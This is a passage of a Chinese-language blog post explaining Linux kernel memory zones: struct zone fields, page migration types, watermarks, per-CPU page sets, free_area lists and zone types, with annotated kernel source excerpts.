fields */</span><br><br>    <span class="hljs-comment">/* zone 的“水位线”, 使用宏 *_wmark_pages(zone) 进行访问 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _watermark[NR_WMARK];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> watermark_boost;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_reserved_highatomic;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 我们不知道我们将要分配的内存是否是可释放的 或/且 最终会被释放，</span><br><span class="hljs-comment">     * 因此为了避免将整个的几个 GB 的 RAM浪费掉，</span><br><span class="hljs-comment">     * 我们必须要保留一些 lower zone memory</span><br><span class="hljs-comment">     * (否则我们将有在 lower zones 上耗尽所有内存（OOM）的风险，</span><br><span class="hljs-comment">     * 尽管此时在 higher zones 仍有大量的 RAM).</span><br><span class="hljs-comment">     * 若 sysctl_lowmem_reserve_ratio 系统控制项改变，</span><br><span class="hljs-comment">     * 这个数组有可能在运行时被改变</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">long</span> lowmem_reserve[MAX_NR_ZONES];<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br>    <span class="hljs-type">int</span> node;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span>    *<span class="hljs-title">zone_pgdat</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">pageset</span>;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * the high and batch values are copied to individual pagesets for</span><br><span class="hljs-comment">     * faster access</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">int</span> pageset_high;<br>    <span class="hljs-type">int</span> pageset_batch;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SPARSEMEM</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 单个 pageblock_nr_pages block 的标志位. 参见 pageblock-flags.h.</span><br><span class="hljs-comment">     * 在 SPARSEMEM 中, 该 map 存放于 struct mem_section 中</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        *pageblock_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_SPARSEMEM */</span></span><br><br>    <span class="hljs-comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        zone_start_pfn;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * spanned_pages 为该 zone 所包含的 pages 的范围, 包括空洞</span><br><span class="hljs-comment">     * 计算方式如下:</span><br><span class="hljs-comment">     *     spanned_pages = zone_end_pfn - zone_start_pfn;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * present_pages 为该 zone 中存在的物理页框数</span><br><span class="hljs-comment">     * 计算方式如下:</span><br><span class="hljs-comment">     *    present_pages = spanned_pages - absent_pages(pages in holes);</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * managed_pages 为现有的由 buddy system 管理的页面数量, </span><br><span class="hljs-comment">     * 计算方式如下 (reserved_pages 包括由 bootmem allocator 分配的页面):</span><br><span class="hljs-comment">     *    managed_pages = present_pages - reserved_pages;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * present_pages 可能会被内存热拔插或内存电源管理逻辑</span><br><span class="hljs-comment">     * 通过检查(present_pages - managed_pages)来算出未被管理的页面. </span><br><span class="hljs-comment">     * managed_pages 应被页面分配器与 vm 扫描器用以计算所有的水位线与阈值</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 锁规则:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * zone_start_pfn 与 spanned_pages 由 span_seqlock 保护.</span><br><span class="hljs-comment">     * 这是一个顺序锁（seqlock，译者补充：写优先锁）因为他得在 zone-&gt;lock 之外被读取,</span><br><span class="hljs-comment">     * 在主分配器路径中完成. </span><br><span class="hljs-comment">     * 但他确实不经常被写入。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * span_seq lock 随着 zone-&gt;lock 被定义，因为相较于 zone-&gt;lock，</span><br><span class="hljs-comment">     * 他经常被读取. 让他们有个机会在同一条缓存线（cacheline）上一件好事</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 运行时 present_pages 应当由 mem_hotplug_begin/end() 进行保护.</span><br><span class="hljs-comment">     * 任何无法忍受 present_pages 的应当使用 get_online_mems()来获得固定的值.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">atomic_long_t</span>        managed_pages;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        spanned_pages;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        present_pages;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>        *name;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 独立的 pageblock 的数量. 用以解决由于对 pagelock</span><br><span class="hljs-comment">     * 的 migratetype 的竞态检索导致的对 freepage 的错误计数.</span><br><span class="hljs-comment">     * 由 zone-&gt;lock 保护</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        nr_isolate_pageblock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span><br>    <span class="hljs-comment">/* 参见 spanned/present_pages 以获得更多描述 */</span><br>    <span class="hljs-type">seqlock_t</span>        span_seqlock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-type">int</span> initialized;<br><br>    <span class="hljs-comment">/* 供页分配器使用的写敏感字段 */</span><br>    ZONE_PADDING(_pad1_)<br><br>    <span class="hljs-comment">/* 不同 sizes 的闲置区域 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span>    <span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br><br>    <span class="hljs-comment">/* zone 标志位 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        flags;<br><br>    <span class="hljs-comment">/* 主要保护 free_area */</span><br>    <span class="hljs-type">spinlock_t</span>        lock;<br><br>    <span class="hljs-comment">/* 供 compaction and vmstats 使用的写敏感字段. */</span><br>    ZONE_PADDING(_pad2_)<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 当闲置页在这一点下时, 在读取闲置页数量时会采取额外的步骤</span><br><span class="hljs-comment">     * 以避免 per-cpu 计数器</span><br><span class="hljs-comment">     * 漂移导致水位线被突破</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> percpu_drift_mark;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span><br>    <span class="hljs-comment">/* pfn where compaction free scanner should start */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        compact_cached_free_pfn;<br>    <span class="hljs-comment">/* pfn where compaction migration scanner should start */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        compact_cached_migrate_pfn[ASYNC_AND_SYNC];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        compact_init_migrate_pfn;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        compact_init_free_pfn;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPACTION</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span><br><span class="hljs-comment">     * are skipped before trying again. The number attempted since</span><br><span class="hljs-comment">     * last failure is tracked with compact_considered.</span><br><span class="hljs-comment">     * compact_order_failed is the minimum compaction failed order.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        compact_considered;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        compact_defer_shift;<br>    <span class="hljs-type">int</span>            compact_order_failed;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span><br>    <span class="hljs-comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span><br>    <span class="hljs-type">bool</span>            compact_blockskip_flush;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-type">bool</span>            contiguous;<br><br>    ZONE_PADDING(_pad3_)<br>    <span class="hljs-comment">/* Zone 的统计数据 */</span><br>    <span class="hljs-type">atomic_long_t</span>        vm_stat[NR_VM_ZONE_STAT_ITEMS];<br>    <span class="hljs-type">atomic_long_t</span>        vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];<br>&#125; ____cacheline_internodealigned_in_smp;<br></code></pre></td></tr></table></figure><h2 id="I-页面迁移机制"><a href="#I-页面迁移机制" class="headerlink" title="I.页面迁移机制"></a>I.页面迁移机制</h2><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><h3 id="迁移类型"><a href="#迁移类型" class="headerlink" title="迁移类型"></a>迁移类型</h3><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>    MIGRATE_UNMOVABLE,<br>    MIGRATE_MOVABLE,<br>    MIGRATE_RECLAIMABLE,<br>    MIGRATE_PCPTYPES,    <span class="hljs-comment">/* the number of types on the pcp lists */</span><br>    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment">     * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment">     * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment">     * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment">     * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment">     * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment">     * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment">     * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment">     * a single pageblock.</span><br><span class="hljs-comment">     */</span><br>    MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>    MIGRATE_ISOLATE,    <span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES_：表示迁移类型的数目，_并不存在这一链表</em></li></ul><h2 id="II-几个比较重要的字段"><a href="#II-几个比较重要的字段" class="headerlink" title="II.几个比较重要的字段"></a>II.几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="watermark：“水位线”"><a href="#watermark：“水位线”" class="headerlink" title="_watermark：“水位线”"></a>_watermark：“水位线”</h3><p>每一个 zone 都有着其对应的三档“水位线”： <code>WMARK_MIN</code>、<code>WMARK_LOW</code>、<code>WMARK_HIGH</code>，存放在 _watermark 数组中，在进行内存分配时，分配器（例如 buddy system）会根据当前 zone 中空余内存所处在的“水位线”来判断当前的内存状况，如下图所示：</p><blockquote><p>图仍然是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/8OuZhEfjHIy9AeL.png" alt="image.png"></p><blockquote><p>具体机制可以参见<a href="https://zhuanlan.zhihu.com/p/73539328">这里</a></p></blockquote><h3 id="lowmem-reserve：zone-自身的保留内存"><a href="#lowmem-reserve：zone-自身的保留内存" class="headerlink" title="lowmem_reserve：zone 自身的保留内存"></a>lowmem_reserve：zone 自身的保留内存</h3><p>在进行内存分配时，若当前的 zone 没有足够的内存了，则会向下一个 zone 索要内存，那么这就存在一个问题：来自 higher zones 的内存分配请求可能耗尽 lower zones 的内存，但这样分配的内存未必是可释放的（freeable），亦或者&#x2F;且最终不一定会被释放，这有可能导致 <strong>lower zones 的内存提前耗尽，而 higher zones 却仍保留有大量的内存</strong></p><p>为了避免这样的一种情况的发生，<code>lowmem_reserve</code> 字段用以声明<strong>为该 zone 保留的内存</strong>，这一块内存别的 zone 是不能动的</p><h3 id="node：NUMA-中标识所属-node"><a href="#node：NUMA-中标识所属-node" class="headerlink" title="node：NUMA 中标识所属 node"></a><em>node：NUMA 中标识所属 node</em></h3><p>这个字段只在 NUMA 系统中被启用，用以标识该 zone 所属的 node</p><p>可以参考下面的图</p><blockquote><p>图还是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/LlaVq9eREW5sJAH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/25/uwbo53W2Mjh1gOm.png" alt="image.png"></p><h3 id="zone-pgdat：zone-所属的-pglist-data-节点"><a href="#zone-pgdat：zone-所属的-pglist-data-节点" class="headerlink" title="zone_pgdat：zone 所属的 pglist_data 节点"></a>zone_pgdat：zone 所属的 pglist_data 节点</h3><p>该字段用以标识该 zone 所属的 pglist_data 节点</p><h3 id="pageset-：zone-为每个-CPU-划分一个独立的”页面仓库“"><a href="#pageset-：zone-为每个-CPU-划分一个独立的”页面仓库“" class="headerlink" title="**pageset**：zone 为每个 CPU 划分一个独立的”页面仓库“"></a>**pageset**：zone 为每个 CPU 划分一个独立的”页面仓库“</h3><p>众所周知伴随着多 CPU 的引入，<strong>条件竞争</strong>就是一个不可忽视的问题，当多个 CPU 需要对一个 zone 进行操作时，频繁的加锁&#x2F;解锁操作则毫无疑问会造成大量的开销，因此 zone 引入了 <code>per_cpu_pageset</code> 结构体成员，即<strong>为每一个 CPU 都准备一个单独的页面仓库</strong>，因此其实现方式是实现为一个 <code>percpu</code> 变量</p><p>在一开始时 buddy system 会将页面放置到各个 CPU 自己独立的页面仓库中，需要进行分配时 CPU 优先从自己的页面仓库中分配</p><p>该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> &#123;</span><br>    <span class="hljs-type">int</span> count;        <span class="hljs-comment">/* 链表中页的数量 */</span><br>    <span class="hljs-type">int</span> high;        <span class="hljs-comment">/* 高水位线, 清空需要（笔者补：用以进行判断） */</span><br>    <span class="hljs-type">int</span> batch;        <span class="hljs-comment">/* chunk size for buddy add/remove */</span><br><br>    <span class="hljs-comment">/* 页面链表, 在 pcp-lists 上储存的独立的迁移类型 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lists</span>[<span class="hljs-title">MIGRATE_PCPTYPES</span>];</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> <span class="hljs-title">pcp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br>    s8 expire;<br>    u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SMP</span><br>    s8 stat_threshold;<br>    s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>该结构体会被存放在每个 CPU 自己独立的 <code>.data..percpu</code> 段中，以 CPU0 为例，结构如下图所示</p><p><img src="https://i.loli.net/2021/12/03/1dCZA3IDpUK2xYg.png" alt="自己画的图.png"></p><h3 id="zone-start-pfn：zone-的起始物理PFN"><a href="#zone-start-pfn：zone-的起始物理PFN" class="headerlink" title="zone_start_pfn：zone 的起始物理PFN"></a>zone_start_pfn：zone 的起始物理PFN</h3><p>该字段用以标识该 zone 的起始物理<strong>页帧编号</strong>（page frame number）</p><h3 id="spanned-pages：-zone-对应的内存区域中的-pages-总数（包括空洞）"><a href="#spanned-pages：-zone-对应的内存区域中的-pages-总数（包括空洞）" class="headerlink" title="spanned_pages： zone 对应的内存区域中的 pages 总数（包括空洞）"></a>spanned_pages： zone 对应的内存区域中的 pages 总数（包括空洞）</h3><p>该字段用以标识该 zone 对应的内存区域中的 pages 总数, <strong>包括空洞</strong></p><h3 id="present-pages：-zone-中存在的物理页框数"><a href="#present-pages：-zone-中存在的物理页框数" class="headerlink" title="present_pages： zone 中存在的物理页框数"></a>present_pages： zone 中存在的物理页框数</h3><p>该字段用以标识  zone 中实际存在的物理页框数</p><h3 id="managed-pages：zone-中-buddy-system-管理的页面数量"><a href="#managed-pages：zone-中-buddy-system-管理的页面数量" class="headerlink" title="managed_pages：zone 中 buddy system 管理的页面数量"></a>managed_pages：zone 中 buddy system 管理的页面数量</h3><p>该字段用以标识 zone 中 buddy system 管理的页面数量</p><h3 id="free-area-：buddy-system-按照-order-管理的页面"><a href="#free-area-：buddy-system-按照-order-管理的页面" class="headerlink" title="**free_area**：buddy system 按照 order 管理的页面"></a>**free_area**：buddy system 按照 order 管理的页面</h3><p>该字段用以存储 buddy system 按照 order 管理的页面，为一个 <code>free_area</code> 结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>    <span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，这里放一张 overview</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>free_area 中并非只有一个双向链表，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="vm-stat：统计数据"><a href="#vm-stat：统计数据" class="headerlink" title="vm_stat：统计数据"></a>vm_stat：统计数据</h3><p>该数组用来进行数据统计，按照枚举类型 <code>zone_stat_item</code> 分为多个数组，以统计不同类型的数据（比如说 <code>NR_FREE_PAGES</code> 表示 zone 中的空闲页面1数量）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_stat_item</span> &#123;</span><br><span class="hljs-comment">/* First 128 byte cacheline (assuming 64 bit words) */</span><br>NR_FREE_PAGES,<br>NR_ZONE_LRU_BASE, <span class="hljs-comment">/* Used only for compaction and reclaim retry */</span><br>NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,<br>NR_ZONE_ACTIVE_ANON,<br>NR_ZONE_INACTIVE_FILE,<br>NR_ZONE_ACTIVE_FILE,<br>NR_ZONE_UNEVICTABLE,<br>NR_ZONE_WRITE_PENDING,<span class="hljs-comment">/* Count of dirty, writeback and unstable pages */</span><br>NR_MLOCK,<span class="hljs-comment">/* mlock()ed pages found and moved off LRU */</span><br><span class="hljs-comment">/* Second 128 byte cacheline */</span><br>NR_BOUNCE,<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_ZSMALLOC)</span><br>NR_ZSPAGES,<span class="hljs-comment">/* allocated in zsmalloc */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_FREE_CMA_PAGES,<br>NR_VM_ZONE_STAT_ITEMS &#125;;<br></code></pre></td></tr></table></figure><h3 id="flags：标志位-1"><a href="#flags：标志位-1" class="headerlink" title="flags：标志位"></a>flags：标志位</h3><p>该 zone 的标志位，用以标识其所处的状态</p><h2 id="II-zone-的分类"><a href="#II-zone-的分类" class="headerlink" title="II.zone 的分类"></a>II.zone 的分类</h2><p>在 Linux kernel 当中，我们根据内存区段的不同用途，将其划分为不同的 zone，在 <code>/include/linux/mmzone.h</code> 中有着相应的枚举定义，如下：</p><blockquote><p>摆烂了，可能某天想起来会补充翻译</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span><br><span class="hljs-comment">     * to DMA to all of the addressable memory (ZONE_NORMAL).</span><br><span class="hljs-comment">     * On architectures where this area covers the whole 32 bit address</span><br><span class="hljs-comment">     * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span><br><span class="hljs-comment">     * DMA addressing constraints. This distinction is important as a 32bit</span><br><span class="hljs-comment">     * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span><br><span class="hljs-comment">     * platforms may need both zones as they support peripherals with</span><br><span class="hljs-comment">     * different DMA addressing limitations.</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>    ZONE_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA32</span><br>    ZONE_DMA32,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span><br><span class="hljs-comment">     * performed on pages in ZONE_NORMAL if the DMA devices support</span><br><span class="hljs-comment">     * transfers to all addressable memory.</span><br><span class="hljs-comment">     */</span><br>    ZONE_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A memory area that is only addressable by the kernel through</span><br><span class="hljs-comment">     * mapping portions into its own address space. This is for example</span><br><span class="hljs-comment">     * used by i386 to allow the kernel to address the memory beyond</span><br><span class="hljs-comment">     * 900MB. The kernel will set up special mappings (page</span><br><span class="hljs-comment">     * table entries on i386) for each page that the kernel needs to</span><br><span class="hljs-comment">     * access.</span><br><span class="hljs-comment">     */</span><br>    ZONE_HIGHMEM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span><br><span class="hljs-comment">     * movable pages with few exceptional cases described below. Main use</span><br><span class="hljs-comment">     * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span><br><span class="hljs-comment">     * likely to succeed, and to locally limit unmovable allocations - e.g.,</span><br><span class="hljs-comment">     * to increase the number of THP/huge pages. Notable special cases are:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 1. Pinned pages: (long-term) pinning of movable pages might</span><br><span class="hljs-comment">     *    essentially turn such pages unmovable. Memory offlining might</span><br><span class="hljs-comment">     *    retry a long time.</span><br><span class="hljs-comment">     * 2. memblock allocations: kernelcore/movablecore setups might create</span><br><span class="hljs-comment">     *    situations where ZONE_MOVABLE contains unmovable allocations</span><br><span class="hljs-comment">     *    after boot. Memory offlining and allocations fail early.</span><br><span class="hljs-comment">     * 3. Memory holes: kernelcore/movablecore setups might create very rare</span><br><span class="hljs-comment">     *    situations where ZONE_MOVABLE contains memory holes after boot,</span><br><span class="hljs-comment">     *    for example, if we have sections that are only partially</span><br><span class="hljs-comment">     *    populated. Memory offlining and allocations fail early.</span><br><span class="hljs-comment">     * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span><br><span class="hljs-comment">     *    memory offlining, such pages cannot be allocated.</span><br><span class="hljs-comment">     * 5. Unmovable PG_offline pages: in paravirtualized environments,</span><br><span class="hljs-comment">     *    hotplugged memory blocks might only partially be managed by the</span><br><span 